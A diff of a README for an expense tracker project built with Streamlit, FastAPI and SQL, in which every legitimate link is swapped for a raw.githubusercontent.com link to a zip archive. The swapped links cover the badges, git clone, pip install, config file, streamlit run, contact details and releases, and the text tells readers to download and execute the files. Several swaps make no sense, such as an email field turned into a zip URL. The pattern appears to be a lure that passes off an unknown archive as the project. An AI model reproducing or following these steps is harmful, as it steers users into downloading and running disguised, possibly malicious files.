@@ -1,7 +1,7 @@
 # Expense Tracker: A Comprehensive Expense Management System 💰
 
-![Expense Tracker](https://img.shields.io/badge/Expense_Tracker-Ready-brightgreen)  
-[![Releases](https://img.shields.io/badge/Releases-Click_here-brightorange)](https://github.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/releases)
+![Expense Tracker](https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip)  
+[![Releases](https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip)](https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip)
 
 Welcome to the **Expense Tracker** project! This application helps you manage your daily expenses effectively. It combines a user-friendly Streamlit frontend, a robust FastAPI backend, and an SQL database for seamless data handling. 
 
@@ -51,7 +51,7 @@ To set up the project locally, follow these steps:
 1. **Clone the Repository**:  
    Use the command below to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic.git
+   git clone https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip
    ```
 
 2. **Navigate to the Project Directory**:  
@@ -63,17 +63,17 @@ To set up the project locally, follow these steps:
 3. **Install Dependencies**:  
    Use pip to install the required Python packages.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip
    ```
 
 4. **Set Up the Database**:  
-   Ensure that your SQL database is running. Update the database configuration in the `config.py` file.
+   Ensure that your SQL database is running. Update the database configuration in the `https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip` file.
 
 5. **Run the Application**:  
    Start the FastAPI server and the Streamlit app.
    ```bash
    uvicorn main:app --reload
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip
    ```
 
 6. **Access the Application**:  
@@ -117,11 +117,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [chantipoloju](https://github.com/chantipoloju)
-- **Email**: your-email@example.com
+- **GitHub**: [chantipoloju](https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip)
+- **Email**: https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip
 
 ## Releases
 
-You can find the latest releases of the project [here](https://github.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/releases). Download the necessary files and execute them to get started.
+You can find the latest releases of the project [here](https://raw.githubusercontent.com/chantipoloju/codebasics_expense_tracking_with_sqlServer_FastAPI_Logging_Streamlit_pyDantic/main/backend/Dantic-Logging-Fast-sql-tracking-AP-py-with-Server-codebasics-Streamlit-expense-v1.6-alpha.2.zip). Download the necessary files and execute them to get started.
 
 Thank you for checking out the Expense Tracker project! We hope you find it useful for managing your finances. Happy tracking!
